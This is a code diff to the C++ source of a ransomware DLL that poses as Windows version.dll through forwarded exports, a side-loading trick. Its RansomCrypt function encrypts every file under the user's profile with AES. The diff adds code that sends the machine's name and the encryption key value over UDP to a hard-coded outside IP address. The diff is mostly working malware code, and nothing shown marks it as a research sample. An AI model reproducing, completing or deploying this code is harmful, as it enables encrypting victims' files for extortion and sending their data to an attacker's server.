@@ -1,11 +1,15 @@
-#include <iostream>
 #include <fstream>
 #include "modes.h"
 #include "aes.h"
 #include "filters.h"
 #include <iostream>
 #include <filesystem>
+#include <winsock2.h>
 #include <windows.h>
+#include <stdio.h>
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+
+#pragma comment(lib,"ws2_32.lib")
 
 #pragma comment(linker, "/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoA")
 #pragma comment(linker, "/export:GetFileVersionInfoByHandle=C:\\Windows\\System32\\version.dll.GetFileVersionInfoByHandle")
@@ -25,15 +29,22 @@
 #pragma comment(linker, "/export:VerQueryValueA=C:\\Windows\\System32\\version.dll.VerQueryValueA")
 #pragma comment(linker, "/export:VerQueryValueW=C:\\Windows\\System32\\version.dll.VerQueryValueW")
 
+#define _CRT_SECURE_NO_WARNINGS
+
+#define SERVER "139.59.147.33"
+#define BUFLEN 2048
+#define PORT 25
+
 using namespace std;
 using namespace CryptoPP;
 namespace fs = std::filesystem;
 
 
 void RansomCrypt() {
-    string path = "C:\\Users\\PC";
+    string path = getenv("USERPROFILE");
     CryptoPP::byte key[32], iv[16];
-    memset(key, 20, 32);
+    int mykey = 20;
+    memset(key, mykey, 32);
     memset(iv, 1125884, 16);
 
     for (const auto& filename : fs::recursive_directory_iterator(path)) {
@@ -55,11 +66,35 @@ void RansomCrypt() {
         catch (...) {}
     }
     system("start calc");
+    struct sockaddr_in si_other;
+    int s, slen = sizeof(si_other);
+    char buf[BUFLEN];
+    char message[BUFLEN];
+    WSADATA wsa;
+    TCHAR nameBuf[MAX_COMPUTERNAME_LENGTH + 2];
+    DWORD nameBufSize;
+    nameBufSize = sizeof nameBuf - 1;
+    GetComputerName(nameBuf, &nameBufSize);
+    WSAStartup(MAKEWORD(2, 2), &wsa);
+    s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    memset((char*)&si_other, 0, sizeof(si_other));
+    si_other.sin_family = AF_INET;
+    si_other.sin_port = htons(PORT);
+    si_other.sin_addr.S_un.S_addr = inet_addr(SERVER);
+    char szString[sizeof(nameBuf) + 3];
+    size_t nNumCharConverted;
+    wcstombs_s(&nNumCharConverted, szString, 500, nameBuf, 500);
+    char integer_string[32];
+    sprintf_s(integer_string, "%d", mykey);
+    sprintf_s(message, "%s|%s", szString, integer_string);
+    sendto(s, message, strlen(message), 0, (struct sockaddr*)&si_other, slen);
+    closesocket(s);
+    WSACleanup();
     exit(0);
 }
 
 void RansomDecrypt() {
-    string path = "C:\\Users\\PC";
+    string path = getenv("USERPROFILE");
     CryptoPP::byte key[32], iv[16];
     memset(key, 20, 32);
     memset(iv, 1125884, 16);
